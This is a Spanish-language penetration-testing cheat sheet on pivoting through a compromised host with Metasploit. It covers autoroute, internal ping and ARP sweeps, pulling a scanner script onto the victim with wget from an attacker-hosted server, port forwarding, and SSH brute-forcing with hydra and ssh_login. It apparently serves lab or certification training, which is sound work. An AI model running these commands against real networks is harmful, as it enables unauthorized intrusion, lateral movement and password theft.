# Pivoting con Metasploit

El pivoting permite atacar máquinas en una red interna a través de una máquina intermediaria (víctima comprometida).

## 1. Identificar Interfaces de Red

Desde meterpreter en la maquina intermediaria:

```bash
ipconfig
```

Identificar las interfaces: una hacia nuestra red (atacante) y otra hacia la red interna.

## 2. Enviar la Sesion a Segundo Plano

```bash
Ctrl+Z
sessions -l
```

## 3. Configurar Autoroute

Autoroute enruta el tráfico de nuestra máquina atacante hacia la red interna a través de la sesión de meterpreter.

```bash
use multi/manage/autoroute
set SESSION 1
run
```

Verificar la ruta:

```bash
route
```

## 4. Escanear la Red Interna

### Con ARP Scanner (Metasploit)

```bash
use windows/gather/arp_scanner
set SESSION 1
set RHOSTS <IP>/24
run
```

### Ping Sweep con Bash

Ping sweep con one liner:

```shell
for i in {1..254}; do (ping -c 1 -W 1 <192.168.1>.$i | grep "bytes from" &) ;done
```

### Ping Sweep con Script

Crear un script `scanner.sh` en nuestra máquina:

```bash
#!/bin/bash
for i in {1..255}; do
  timeout 1 bash -c "ping -c 1 10.10.10.$i" >/dev/null
  if [ $? -eq 0 ]; then
    echo "El host 10.10.10.$i esta activo"
  fi
done
```

Transferir a la máquina intermediaria:

```bash
python3 -m http.server 80
```

```bash
wget <IP_atacante>/scanner.sh
chmod +x scanner.sh
./scanner.sh
```

## 5. Escanear Puertos con Metasploit

```bash
use scanner/portscan/tcp
set RHOSTS <IP_objetivo_interno>
run
```

## 6. Port Forwarding

Redirige puertos de la máquina interna hacia nuestra máquina atacante.

```meterpreter
session -i 1
portfwd add -l 222 -p 22 -r <IP_maquina_interna>
```

Ahora podemos conectarnos como si el servicio estuviera en local:

```bash
ssh usuario@127.0.0.1 -p 222
```

```meterpreter
portfwd add -l 5000 -p 80 -r <IP_maquina_final>
portfwd
```

> Ahora `http://127.0.0.1:5000` muestra el servicio web de la máquina interna.

## 7. Fuerza Bruta contra Servicio Pivoteado

Fuerza bruta a contraseñas o usuarios:

```bash
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -s 222
hydra -L <diccionario> -p <password> ssh://127.0.0.1 -s 222
```

Fuerza Bruta con msf6 en máquina remota:

```msf6
use scanner/ssh/ssh_login
set PASS_FILE /usr/share/wordlist/rockyou.txt
set RHOST <IP_objetivo_red_interna>
set username <root>    #nombre común
```
> Crea una nueva sesión de ssh que se puede abrir con `session -i <ID_session>`

